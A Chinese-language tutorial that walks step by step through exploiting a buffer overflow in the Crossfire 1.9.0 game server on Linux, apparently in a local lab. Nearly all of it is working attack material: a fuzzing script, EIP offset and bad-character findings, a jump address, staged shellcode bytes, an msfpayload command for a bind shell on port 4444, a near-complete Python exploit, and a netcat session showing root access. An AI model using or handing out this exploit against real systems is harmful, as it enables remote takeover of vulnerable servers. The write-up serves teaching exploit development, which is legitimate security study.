# Linux 缓冲区溢出实例

> 以 Crossfire 1.9.0（多人在线RPG游戏）为例，演示 Linux 环境下的缓冲区溢出漏洞利用过程。该版本在接受入站 socket 连接时存在缓冲区溢出漏洞。

## 0x01 环境准备

- **调试工具**: edb-debugger
- **运行平台**: Kali i486 虚拟机
- **目标程序**: Crossfire 1.9.0

### 安装 Crossfire

```bash
mv crossfire.tar.gz /usr/games/
cd /usr/games/
tar zxpf crossfire.tar.gz
```

### 配置防火墙限制

本机调试时，限制外部访问调试端口:

```bash
iptables -A INPUT -p tcp --destination-port 4444 \! -d 127.0.0.1 -j DROP
iptables -A INPUT -p tcp --destination-port 13327 \! -d 127.0.0.1 -j DROP
```

## 0x02 启动调试

```bash
# 使用 edb 加载目标程序
edb --run /usr/games/crossfire/bin/crossfire

# 点两次 run 按钮使程序进入 running 状态

# 确认端口监听
netstat -pantu | grep 13327
```

## 0x03 Fuzzing 阶段

### Step 1: 确认崩溃点

发送大量数据触发崩溃:

```python
#!/usr/bin/python
import socket

host = "127.0.0.1"
crash = "\x41" * 4379
buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Sending evil buffer...")
s.connect((host, 13327))
data = s.recv(1024)
print(data)
s.send(buffer)
s.close()
print("[*] Payload Sent!")
```

### Step 2: 精确定位 EIP

使用 Metasploit 的 pattern 工具:

```bash
# 生成唯一字符串
/usr/share/metasploit-framework/tools/pattern_create.rb 4379

# 替换 crash 变量为生成的唯一字符串并发送

# 查找 EIP 中的偏移
/usr/share/metasploit-framework/tools/pattern_offset.rb 46367046
# [*] Exact match at offset 4368
```

### Step 3: 验证 EIP 控制

```python
crash = 'A' * 4368 + 'B' * 4 + 'C' * 7
```

运行后 EIP 应被覆盖为 `42424242`（BBBB），确认偏移正确。

## 0x04 编写 Exploit

### 查找坏字符

测试发现坏字符: `\x00\x0a\x0b\x20`

### 确定跳转地址

利用 edb 的 Opcode Search 功能查找 `jmp esp` 指令地址: `0x08134597`

### 第一阶段 Shellcode

由于 ESP 后空间有限，采用跳板策略: ESP → 跳转到 EAX → 偏移12字节到达 Shellcode:

```bash
# 使用 nasm_shell 获取机器码
/usr/share/metasploit-framework/tools/nasm_shell.rb
nasm > add eax,12    # \x83\xc0\x0c
nasm > jmp eax       # \xff\xe0
```

第一阶段 shellcode: `\x83\xc0\x0c\xff\xe0\x90\x90`

### 生成 Payload

```bash
msfpayload linux/x86/shell_bind_tcp LPORT=4444 R | msfencode -b "\x00\x0a\x0b\x20"
```

### 最终 Exploit

```python
#!/usr/bin/python
import socket

host = "127.0.0.1"
shellcode = (
    # msfpayload 生成的 shellcode（排除坏字符）
)

crash = shellcode + 'A' * (4368 - len(shellcode)) + '\x97\x45\x13\x00' + '\x83\xc0\x0c\xff\xe0\x90\x90'
buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Sending evil buffer...")
s.connect((host, 13327))
data = s.recv(1024)
print(data)
s.send(buffer)
s.close()
print("[*] Payload Sent!")
```

## 0x05 验证利用

```bash
# 运行 Exploit
./exploit.py

# 确认 shell 绑定
netstat -pantu | grep 4444

# 连接获取 shell
nc 127.0.0.1 4444
id
# uid=0(root) gid=0(root) groups=0(root)
```

## 0x06 总结

Linux 缓冲区溢出利用思路:

1. **Fuzzing**: 发送大量数据确认崩溃
2. **定位EIP**: 使用 pattern_create/pattern_offset 精确定位
3. **查找坏字符**: 逐步排除影响 shellcode 的字符
4. **查找跳转地址**: 在程序模块中寻找可用的跳转指令
5. **编写 Shellcode**: 考虑空间限制，可能需要分阶段跳转
6. **验证利用**: 获取 Shell 确认漏洞利用成功
